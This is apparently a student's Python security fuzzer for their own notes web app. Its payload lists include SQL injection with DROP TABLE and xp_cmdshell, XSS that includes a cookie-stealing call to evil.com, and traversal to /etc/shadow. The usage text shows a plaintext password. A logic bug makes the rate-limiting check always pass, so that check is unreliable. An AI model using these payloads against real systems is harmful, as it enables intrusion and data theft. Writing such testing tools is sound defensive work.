#!/usr/bin/env python3
"""
Security Fuzzing Script for Secure Notes Application
=====================================================

This script performs automated security testing (DAST - Dynamic Application 
Security Testing) against the web application to identify common vulnerabilities.

Tests included:
- SQL Injection payloads
- XSS (Cross-Site Scripting) payloads  
- Path Traversal attempts
- IDOR (Insecure Direct Object Reference) testing
- CSRF token validation
- Authentication bypass attempts

Author: CCT Student
Module: Secure Programming and Scripting
Date: 2025

Usage:
    python fuzzer.py --url http://localhost:5001
    python fuzzer.py --url http://localhost:5001 --output report.txt
    python fuzzer.py --url http://localhost:5001  --user globsecure --password 'E32q12w21#' --output reports/fuzz_report.txt
"""

import argparse
import requests
import sys
import re
from datetime import datetime
from urllib.parse import urljoin
from typing import List, Dict, Tuple

# Disable SSL warnings for self-signed certs in testing
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ============================================================================
# PAYLOAD DEFINITIONS
# ============================================================================

# SQL Injection payloads - Common attack patterns
SQL_INJECTION_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "1' OR '1'='1",
    "admin'--",
    "' UNION SELECT NULL--",
    "' UNION SELECT username, password FROM users--",
    "1; DROP TABLE users--",
    "' AND 1=1--",
    "' AND 1=2--",
    "'; EXEC xp_cmdshell('dir');--",
    "1 OR 1=1",
    "' OR ''='",
    "\" OR \"\"=\"",
    "or 1=1",
    "' or 'x'='x",
]

# XSS payloads - Various attack vectors
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<body onload=alert('XSS')>",
    "<iframe src='javascript:alert(1)'>",
    "<input onfocus=alert('XSS') autofocus>",
    "'-alert(1)-'",
    "\"><script>alert('XSS')</script>",
    "<a href=\"javascript:alert('XSS')\">click</a>",
    "<div onmouseover=\"alert('XSS')\">hover me</div>",
    "{{constructor.constructor('alert(1)')()}}",  # Template injection
    "${alert('XSS')}",  # Template literal injection
    "<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
]

# Path traversal payloads
PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc/passwd",
    "/etc/passwd",
    "file:///etc/passwd",
    "....//....//....//....//etc/shadow",
]

# Common error messages that indicate vulnerabilities
SQL_ERROR_PATTERNS = [
    r"SQL syntax",
    r"mysql_fetch",
    r"ORA-\d+",
    r"PostgreSQL.*ERROR",
    r"SQLite.*error",
    r"Microsoft.*ODBC",
    r"JDBC.*Exception",
    r"Unclosed quotation mark",
    r"syntax error",
]

XSS_REFLECTION_PATTERNS = [
    r"<script>alert",
    r"onerror=",
    r"onload=",
    r"javascript:",
]


class SecurityFuzzer:
    """
    Main fuzzer class that coordinates security testing.
    """
    
    def __init__(self, base_url: str, verbose: bool = False, username: str = None, password: str = None):
        self.base_url = base_url.rstrip('/')
        self.verbose = verbose
        self.username = username
        self.password = password
        self.authenticated = False
        self.session = requests.Session()
        self.results = {
            'sql_injection': [],
            'xss': [],
            'path_traversal': [],
            'idor': [],
            'csrf': [],
            'auth_bypass': [],
            'security_headers': [],
            'rate_limiting': [],
            'https_enforcement': [],
        }
        self.total_tests = 0
        self.vulnerabilities_found = 0
    
    def log(self, msg: str, level: str = 'INFO'):
        """Print log message if verbose mode is on."""
        if self.verbose or level in ['WARNING', 'CRITICAL']:
            timestamp = datetime.now().strftime('%H:%M:%S')
            print(f"[{timestamp}] [{level}] {msg}")
    
    def make_request(self, method: str, endpoint: str, **kwargs) -> requests.Response:
        """Make HTTP request with error handling."""
        url = urljoin(self.base_url, endpoint)
        kwargs.setdefault('timeout', 10)
        kwargs.setdefault('verify', False)  # Allow self-signed certs
        
        try:
            if method.upper() == 'GET':
                return self.session.get(url, **kwargs)
            elif method.upper() == 'POST':
                return self.session.post(url, **kwargs)
            else:
                raise ValueError(f"Unsupported HTTP method: {method}")
        except requests.RequestException as e:
            self.log(f"Request failed: {e}", 'WARNING')
            return None
    
    def get_csrf_token(self, endpoint: str) -> str:
        """Extract CSRF token from a page."""
        response = self.make_request('GET', endpoint)
        if response is None:
            return None
        
        # Look for CSRF token in various formats
        patterns = [
            r'name="csrf_token" value="([^"]+)"',
            r'name="csrf_token" content="([^"]+)"',
            r'"csrf_token": "([^"]+)"',
            r'<input[^>]*name=["\']csrf_token["\'][^>]*value=["\']([^"\']+)["\']',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, response.text)
            if match:
                return match.group(1)
        
        return None
    
    def authenticate(self) -> bool:
        """Authenticate with the application using provided credentials."""
        if not self.username or not self.password:
            return False
        
        self.log(f"Attempting to authenticate as user: {self.username}")
        
        # Get login page to extract CSRF token
        response = self.make_request('GET', '/login')
        if response is None:
            self.log("Failed to retrieve login page", 'WARNING')
            return False
        
        # Extract CSRF token
        csrf_token = self.get_csrf_token('/login')
        if not csrf_token:
            self.log("Could not extract CSRF token from login page", 'WARNING')
            # Try without CSRF token (some apps might not require it for testing)
            self.log("Attempting login without CSRF token", 'WARNING')
        
        # Prepare login data
        login_data = {
            'username': self.username,
            'password': self.password,
        }
        if csrf_token:
            login_data['csrf_token'] = csrf_token
        
        # Attempt login (allow redirects to follow to dashboard)
        response = self.make_request('POST', '/login', data=login_data, allow_redirects=True)
        
        if response is None:
            self.log("Login request failed", 'WARNING')
            return False
        
        # Check if login was successful
        # Successful login typically redirects to dashboard
        # Verify by checking final URL or accessing protected endpoint
        if response.status_code == 200:
            # Check if we're on dashboard page
            if 'dashboard' in response.url.lower() or 'dashboard' in response.text.lower():
                self.authenticated = True
                self.log("Authentication successful", 'INFO')
                return True
            else:
                # Verify by trying to access a protected endpoint
                verify_response = self.make_request('GET', '/dashboard', allow_redirects=False)
                if verify_response and verify_response.status_code == 200:
                    self.authenticated = True
                    self.log("Authentication successful", 'INFO')
                    return True
        
        self.log(f"Authentication failed (status: {response.status_code}, url: {response.url})", 'WARNING')
        return False
    
    def test_sql_injection(self, endpoint: str, param_name: str, method: str = 'GET'):
        """Test endpoint for SQL injection vulnerabilities."""
        self.log(f"Testing SQL injection on {endpoint} ({param_name})")
        
        for payload in SQL_INJECTION_PAYLOADS:
            self.total_tests += 1
            
            if method.upper() == 'GET':
                response = self.make_request('GET', endpoint, params={param_name: payload})
            else:
                response = self.make_request('POST', endpoint, data={param_name: payload})
            
            if response is None:
                continue
            
            # Check for SQL error messages in response
            for pattern in SQL_ERROR_PATTERNS:
                if re.search(pattern, response.text, re.IGNORECASE):
                    vuln = {
                        'endpoint': endpoint,
                        'parameter': param_name,
                        'payload': payload,
                        'evidence': pattern,
                        'severity': 'HIGH'
                    }
                    self.results['sql_injection'].append(vuln)
                    self.vulnerabilities_found += 1
                    self.log(f"POTENTIAL SQL INJECTION: {endpoint}", 'CRITICAL')
                    break
    
    def test_xss(self, endpoint: str, param_name: str, method: str = 'GET'):
        """Test endpoint for XSS vulnerabilities."""
        self.log(f"Testing XSS on {endpoint} ({param_name})")
        
        for payload in XSS_PAYLOADS:
            self.total_tests += 1
            
            if method.upper() == 'GET':
                response = self.make_request('GET', endpoint, params={param_name: payload})
            else:
                # For POST, we might need CSRF token
                csrf = self.get_csrf_token(endpoint)
                data = {param_name: payload}
                if csrf:
                    data['csrf_token'] = csrf
                response = self.make_request('POST', endpoint, data=data)
            
            if response is None:
                continue
            
            # Check if payload is reflected without encoding
            if payload in response.text:
                vuln = {
                    'endpoint': endpoint,
                    'parameter': param_name,
                    'payload': payload,
                    'evidence': 'Payload reflected in response',
                    'severity': 'HIGH'
                }
                self.results['xss'].append(vuln)
                self.vulnerabilities_found += 1
                self.log(f"POTENTIAL XSS: {endpoint}", 'CRITICAL')
    
    def test_path_traversal(self, endpoint: str, param_name: str):
        """Test for path traversal vulnerabilities."""
        self.log(f"Testing path traversal on {endpoint} ({param_name})")
        
        for payload in PATH_TRAVERSAL_PAYLOADS:
            self.total_tests += 1
            
            response = self.make_request('GET', endpoint, params={param_name: payload})
            
            if response is None:
                continue
            
            # Check for sensitive file content
            sensitive_patterns = [
                r'root:.*:0:0:',  # /etc/passwd
                r'\[boot loader\]',  # Windows boot.ini
                r'<!DOCTYPE.*html',  # Unexpected HTML
            ]
            
            for pattern in sensitive_patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    vuln = {
                        'endpoint': endpoint,
                        'parameter': param_name,
                        'payload': payload,
                        'evidence': pattern,
                        'severity': 'HIGH'
                    }
                    self.results['path_traversal'].append(vuln)
                    self.vulnerabilities_found += 1
                    self.log(f"POTENTIAL PATH TRAVERSAL: {endpoint}", 'CRITICAL')
                    break
    
    def test_idor(self):
        """Test for Insecure Direct Object Reference vulnerabilities."""
        self.log("Testing IDOR on note endpoints")
        
        # Part 1: Test unauthenticated access
        # Save current session state
        original_cookies = self.session.cookies.copy()
        
        # Clear session to test unauthenticated access
        self.session.cookies.clear()
        
        self.log("Testing unauthenticated access to notes")
        for note_id in range(1, 10):
            self.total_tests += 1
            
            response = self.make_request('GET', f'/note/{note_id}', allow_redirects=False)
            
            if response is None:
                continue
            
            # Unauthenticated access should redirect to login or return 401/403
            # If we get 200 with note content, it's a vulnerability
            if response.status_code == 200:
                # Check if actual note content is displayed (not just a login page)
                if ('note-content' in response.text or 'note-title' in response.text) and 'login' not in response.text.lower():
                    vuln = {
                        'endpoint': f'/note/{note_id}',
                        'evidence': 'Accessed note without authentication',
                        'severity': 'HIGH'
                    }
                    self.results['idor'].append(vuln)
                    self.vulnerabilities_found += 1
                    self.log(f"POTENTIAL IDOR: /note/{note_id} (unauthenticated access)", 'CRITICAL')
        
        # Part 2: Test cross-user access (if authenticated)
        # Note: We can't easily determine note ownership from responses,
        # so we test conservatively - only flag if we can be reasonably sure
        if self.authenticated:
            # Restore authenticated session
            self.session.cookies.clear()
            self.session.cookies.update(original_cookies)
            
            self.log("Testing cross-user access (authenticated)")
            # Test a few note IDs - the app should return 404 for notes we don't own
            # We test a small range to avoid false positives from user's own notes
            for note_id in [999, 998, 997, 50, 25]:  # High IDs unlikely to exist
                self.total_tests += 1
                
                response = self.make_request('GET', f'/note/{note_id}', allow_redirects=False)
                
                if response is None:
                    continue
                
                # The app should return 404 for notes we don't own
                # If we get 200, it could be:
                # 1. A note we own (not IDOR - but we can't verify)
                # 2. A note we don't own (IDOR vulnerability)
                # Since we can't distinguish, we don't flag 200 responses as IDOR
                # Instead, we only flag if we get unexpected behavior
                
                # If we get 200 with note content, log it but don't flag as critical
                # (could be false positive if note belongs to user)
                if response.status_code == 200:
                    if 'note-content' in response.text or 'note-title' in response.text:
                        # Don't flag as IDOR - could be user's own note
                        # The app's authorization check (returning 404 for unauthorized) is working
                        self.log(f"Note {note_id} accessible (may belong to authenticated user)", 'INFO')
                elif response.status_code == 404:
                    # 404 is correct - means authorization check is working
                    pass
                elif response.status_code not in [200, 404]:
                    # Unexpected status code
                    self.log(f"Unexpected status {response.status_code} for /note/{note_id}", 'WARNING')
        else:
            # Restore original session state (even if not authenticated)
            self.session.cookies.clear()
            if original_cookies:
                self.session.cookies.update(original_cookies)
    
    def test_csrf_protection(self):
        """Test if CSRF protection is properly implemented."""
        self.log("Testing CSRF protection")
        
        # Test endpoints that should require CSRF
        csrf_endpoints = [
            ('/login', 'POST', {'username': 'test', 'password': 'test'}),
            ('/register', 'POST', {'username': 'test', 'email': 'test@test.com', 'password': 'test'}),
            ('/note/new', 'POST', {'title': 'test', 'content': 'test'}),
        ]
        
        for endpoint, method, data in csrf_endpoints:
            self.total_tests += 1
            
            # Make request without CSRF token
            response = self.make_request(method, endpoint, data=data)
            
            if response is None:
                continue
            
            # If we don't get a CSRF error, protection might be weak
            if response.status_code not in [400, 403] and 'csrf' not in response.text.lower():
                # Check if the action was actually performed
                if response.status_code == 200 or response.status_code == 302:
                    vuln = {
                        'endpoint': endpoint,
                        'evidence': f'Request accepted without CSRF token (status: {response.status_code})',
                        'severity': 'MEDIUM'
                    }
                    self.results['csrf'].append(vuln)
                    self.vulnerabilities_found += 1
                    self.log(f"POTENTIAL CSRF ISSUE: {endpoint}", 'WARNING')
    
    def test_auth_bypass(self):
        """Test for authentication bypass vulnerabilities."""
        self.log("Testing authentication bypass")
        
        # Test protected endpoints without authentication
        protected_endpoints = [
            '/dashboard',
            '/note/new',
            '/note/1',
            '/note/1/edit',
        ]
        
        for endpoint in protected_endpoints:
            self.total_tests += 1
            
            # Clear any existing session
            self.session.cookies.clear()
            
            response = self.make_request('GET', endpoint, allow_redirects=False)
            
            if response is None:
                continue
            
            # If we get 200 instead of redirect to login, might be vulnerable
            if response.status_code == 200:
                vuln = {
                    'endpoint': endpoint,
                    'evidence': f'Accessed protected endpoint without auth (status: {response.status_code})',
                    'severity': 'HIGH'
                }
                self.results['auth_bypass'].append(vuln)
                self.vulnerabilities_found += 1
                self.log(f"POTENTIAL AUTH BYPASS: {endpoint}", 'CRITICAL')
    
    def test_security_headers(self):
        """Test for presence and correctness of security headers."""
        self.log("Testing security headers")
        
        response = self.make_request('GET', '/')
        if response is None:
            return
        
        self.total_tests += 1
        
        # Required headers and their expected values
        required_headers = {
            'X-Frame-Options': ['DENY', 'SAMEORIGIN'],
            'X-Content-Type-Options': ['nosniff'],
            'Content-Security-Policy': None,  # Just check presence
            'Referrer-Policy': None,  # Just check presence
        }
        
        missing_headers = []
        incorrect_headers = []
        
        for header_name, expected_values in required_headers.items():
            header_value = response.headers.get(header_name)
            
            if not header_value:
                missing_headers.append(header_name)
            elif expected_values and header_value not in expected_values:
                incorrect_headers.append(f"{header_name}: got '{header_value}', expected one of {expected_values}")
        
        # Check for HSTS if using HTTPS
        if self.base_url.startswith('https://'):
            hsts = response.headers.get('Strict-Transport-Security')
            if not hsts:
                missing_headers.append('Strict-Transport-Security')
            elif 'max-age' not in hsts.lower():
                incorrect_headers.append("Strict-Transport-Security: missing max-age")
        
        if missing_headers or incorrect_headers:
            vuln = {
                'endpoint': '/',
                'missing_headers': missing_headers,
                'incorrect_headers': incorrect_headers,
                'severity': 'MEDIUM'
            }
            self.results['security_headers'].append(vuln)
            self.vulnerabilities_found += 1
            self.log(f"MISSING/INCORRECT SECURITY HEADERS: {missing_headers + incorrect_headers}", 'WARNING')
        else:
            self.log("All security headers present and correct", 'INFO')
    
    def test_rate_limiting(self):
        """Test rate limiting behavior on login endpoint."""
        self.log("Testing rate limiting")
        
        # Test username-based rate limiting (IP-based limiting may also apply)
        test_username = f"ratelimit_test_{int(datetime.now().timestamp())}"
        test_password = "wrong_password"
        
        # Make multiple failed login attempts
        attempts = 0
        blocked = False
        
        # Try several times; application config usually limits around 5 attempts
        for i in range(10):
            self.total_tests += 1
            attempts += 1
            
            response = self.make_request('POST', '/login', data={
                'username': test_username,
                'password': test_password
            })
            
            if response is None:
                continue
            
            # Check for lockout indication in response body
            text = response.text.lower()
            if 'too many' in text or 'rate limit' or 'Too many login' in text:
                blocked = True
                self.log(f"Rate limiting triggered after {attempts} attempts", 'INFO')
                break
        
        if not blocked:
            vuln = {
                'endpoint': '/login',
                'evidence': f'Rate limiting not triggered after {attempts} failed attempts',
                'severity': 'MEDIUM'
            }
            self.results['rate_limiting'].append(vuln)
            self.vulnerabilities_found += 1
            self.log("RATE LIMITING NOT WORKING", 'WARNING')
        else:
            self.log("Rate limiting working correctly", 'INFO')
    
    def test_https_enforcement(self):
        """Test HTTPS enforcement and HSTS."""
        self.log("Testing HTTPS enforcement")
        
        # Only test if base URL is HTTPS
        if not self.base_url.startswith('https://'):
            self.log("Skipping HTTPS enforcement test (not using HTTPS)", 'INFO')
            return
        
        self.total_tests += 1
        
        # Try to access via HTTP (replace https with http)
        http_url = self.base_url.replace('https://', 'http://')
        
        try:
            # Make request to HTTP version
            response = requests.get(f"{http_url}/", timeout=5, allow_redirects=False, verify=False)
            
            # Should redirect to HTTPS
            if response.status_code in [301, 302, 307, 308]:
                location = response.headers.get('Location', '')
                if location.startswith('https://'):
                    self.log("HTTP to HTTPS redirect working", 'INFO')
                else:
                    vuln = {
                        'endpoint': '/',
                        'evidence': f'HTTP redirects to {location} (not HTTPS)',
                        'severity': 'MEDIUM'
                    }
                    self.results['https_enforcement'].append(vuln)
                    self.vulnerabilities_found += 1
            else:
                vuln = {
                    'endpoint': '/',
                    'evidence': f'HTTP access allowed (status: {response.status_code})',
                    'severity': 'HIGH'
                }
                self.results['https_enforcement'].append(vuln)
                self.vulnerabilities_found += 1
                self.log("HTTP ACCESS ALLOWED (should redirect to HTTPS)", 'CRITICAL')
        except requests.RequestException:
            # If HTTP request fails, that's actually good (might be firewall blocking)
            self.log("HTTP access blocked (good)", 'INFO')
        
        # Test HSTS header on HTTPS response
        response = self.make_request('GET', '/')
        if response:
            hsts = response.headers.get('Strict-Transport-Security')
            if hsts and 'max-age' in hsts.lower():
                self.log(f"HSTS header present: {hsts}", 'INFO')
            else:
                vuln = {
                    'endpoint': '/',
                    'evidence': 'HSTS header missing or invalid',
                    'severity': 'MEDIUM'
                }
                self.results['https_enforcement'].append(vuln)
                self.vulnerabilities_found += 1
                self.log("HSTS HEADER MISSING", 'WARNING')
    
    def run_all_tests(self):
        """Run all security tests."""
        print(f"\n{'='*60}")
        print(f"SECURITY FUZZER - Starting scan of {self.base_url}")
        if self.username:
            print(f"Authentication: {self.username}")
        print(f"{'='*60}\n")
        
        start_time = datetime.now()
        
        # Authenticate if credentials provided
        if self.username and self.password:
            if not self.authenticate():
                self.log("Authentication failed - some tests may be skipped", 'WARNING')
        else:
            self.log("No credentials provided - running unauthenticated tests only", 'INFO')
        
        # Test login page for SQL injection
        self.test_sql_injection('/login', 'username', 'POST')
        self.test_sql_injection('/login', 'password', 'POST')
        
        # Test registration for XSS
        self.test_xss('/register', 'username', 'POST')
        self.test_xss('/register', 'email', 'POST')
        
        # Test note creation for XSS (requires authentication)
        if self.authenticated:
            self.test_xss('/note/new', 'title', 'POST')
            self.test_xss('/note/new', 'content', 'POST')
        else:
            self.log("Skipping authenticated XSS tests on /note/new (not authenticated)", 'INFO')
        
        # Test IDOR
        self.test_idor()
        
        # Test CSRF protection
        self.test_csrf_protection()
        
        # Test authentication bypass
        self.test_auth_bypass()
        
        # Test security headers
        self.test_security_headers()
        
        # Test rate limiting
        self.test_rate_limiting()
        
        # Test HTTPS enforcement
        self.test_https_enforcement()
        
        end_time = datetime.now()
        duration = (end_time - start_time).total_seconds()
        
        return duration
    
    def generate_report(self, output_file: str = None) -> str:
        """Generate a security report."""
        report_lines = []
        
        report_lines.append("=" * 70)
        report_lines.append("SECURITY FUZZING REPORT")
        report_lines.append("=" * 70)
        report_lines.append(f"\nTarget: {self.base_url}")
        report_lines.append(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        report_lines.append(f"Total Tests Run: {self.total_tests}")
        report_lines.append(f"Potential Vulnerabilities Found: {self.vulnerabilities_found}")
        
        # Summary by category
        report_lines.append("\n" + "-" * 50)
        report_lines.append("SUMMARY BY CATEGORY")
        report_lines.append("-" * 50)
        
        categories = [
            ('SQL Injection', 'sql_injection'),
            ('Cross-Site Scripting (XSS)', 'xss'),
            ('Path Traversal', 'path_traversal'),
            ('IDOR', 'idor'),
            ('CSRF Issues', 'csrf'),
            ('Authentication Bypass', 'auth_bypass'),
            ('Security Headers', 'security_headers'),
            ('Rate Limiting', 'rate_limiting'),
            ('HTTPS Enforcement', 'https_enforcement'),
        ]
        
        for name, key in categories:
            count = len(self.results[key])
            status = "✓ PASS" if count == 0 else f"✗ {count} ISSUE(S)"
            report_lines.append(f"  {name}: {status}")
        
        # Detailed findings
        for name, key in categories:
            if self.results[key]:
                report_lines.append(f"\n{'='*50}")
                report_lines.append(f"DETAILED FINDINGS: {name.upper()}")
                report_lines.append("=" * 50)
                
                for i, vuln in enumerate(self.results[key], 1):
                    report_lines.append(f"\n[{i}] Severity: {vuln.get('severity', 'UNKNOWN')}")
                    report_lines.append(f"    Endpoint: {vuln.get('endpoint', 'N/A')}")
                    if 'parameter' in vuln:
                        report_lines.append(f"    Parameter: {vuln['parameter']}")
                    if 'payload' in vuln:
                        report_lines.append(f"    Payload: {vuln['payload'][:50]}...")
                    report_lines.append(f"    Evidence: {vuln.get('evidence', 'N/A')}")
        
        # Recommendations
        report_lines.append("\n" + "=" * 50)
        report_lines.append("RECOMMENDATIONS")
        report_lines.append("=" * 50)
        
        if self.results['sql_injection']:
            report_lines.append("\n[SQL Injection]")
            report_lines.append("  - Use parameterized queries (ORM recommended)")
            report_lines.append("  - Validate and sanitize all user input")
            report_lines.append("  - Apply principle of least privilege to DB accounts")
        
        if self.results['xss']:
            report_lines.append("\n[XSS]")
            report_lines.append("  - Encode output in HTML context")
            report_lines.append("  - Use Content Security Policy headers")
            report_lines.append("  - Sanitize input with libraries like bleach")
        
        if self.results['idor']:
            report_lines.append("\n[IDOR]")
            report_lines.append("  - Implement proper authorization checks")
            report_lines.append("  - Verify user owns resource before access")
            report_lines.append("  - Use indirect references where possible")
        
        if self.results['csrf']:
            report_lines.append("\n[CSRF]")
            report_lines.append("  - Implement CSRF tokens on all state-changing forms")
            report_lines.append("  - Validate Origin/Referer headers")
            report_lines.append("  - Use SameSite cookie attribute")
        
        if self.results['auth_bypass']:
            report_lines.append("\n[Authentication]")
            report_lines.append("  - Protect all sensitive endpoints")
            report_lines.append("  - Implement proper session management")
            report_lines.append("  - Use authentication middleware/decorators")
        
        if self.results['security_headers']:
            report_lines.append("\n[Security Headers]")
            report_lines.append("  - Ensure all security headers are present")
            report_lines.append("  - Verify header values are correct")
            report_lines.append("  - Use security header middleware or framework features")
        
        if self.results['rate_limiting']:
            report_lines.append("\n[Rate Limiting]")
            report_lines.append("  - Implement rate limiting on authentication endpoints")
            report_lines.append("  - Track attempts by both username and IP address")
            report_lines.append("  - Use exponential backoff for repeated failures")
        
        if self.results['https_enforcement']:
            report_lines.append("\n[HTTPS Enforcement]")
            report_lines.append("  - Configure server to redirect HTTP to HTTPS")
            report_lines.append("  - Set HSTS header with appropriate max-age")
            report_lines.append("  - Use secure cookie flags in production")
        
        report_lines.append("\n" + "=" * 70)
        report_lines.append("END OF REPORT")
        report_lines.append("=" * 70)
        
        report_text = "\n".join(report_lines)
        
        # Write to file if specified
        if output_file:
            with open(output_file, 'w') as f:
                f.write(report_text)
            print(f"\nReport saved to: {output_file}")
        
        return report_text


def main():
    """Main entry point for the fuzzer."""
    parser = argparse.ArgumentParser(
        description='Security Fuzzer for Secure Notes Application',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --url http://localhost:5001
  %(prog)s --url http://localhost:5001 --output report.txt
  %(prog)s --url https://myapp.local --verbose
  %(prog)s --url https://localhost --user test1 --password 'testpass' --output reports/fuzz_report.txt
        """
    )
    
    parser.add_argument('--url', '-u', required=True,
                        help='Base URL of the target application')
    parser.add_argument('--output', '-o', 
                        help='Output file for the report')
    parser.add_argument('--out', dest='output',
                        help='Alias for --output')
    parser.add_argument('--verbose', '-v', action='store_true',
                        help='Enable verbose output')
    parser.add_argument('--user', '-U',
                        help='Username for authentication (enables authenticated testing)')
    parser.add_argument('--password', '-P',
                        help='Password for authentication')
    
    args = parser.parse_args()
    
    # Create and run fuzzer
    fuzzer = SecurityFuzzer(
        args.url, 
        verbose=args.verbose,
        username=args.user,
        password=args.password
    )
    
    try:
        duration = fuzzer.run_all_tests()
        report = fuzzer.generate_report(args.output)
        
        print(report)
        print(f"\nScan completed in {duration:.2f} seconds")
        
        # Exit with error code if vulnerabilities found
        if fuzzer.vulnerabilities_found > 0:
            sys.exit(1)
        
    except KeyboardInterrupt:
        print("\n\nScan interrupted by user")
        sys.exit(130)
    except Exception as e:
        print(f"\nError during scan: {e}")
        sys.exit(1)


if __name__ == '__main__':
    main()

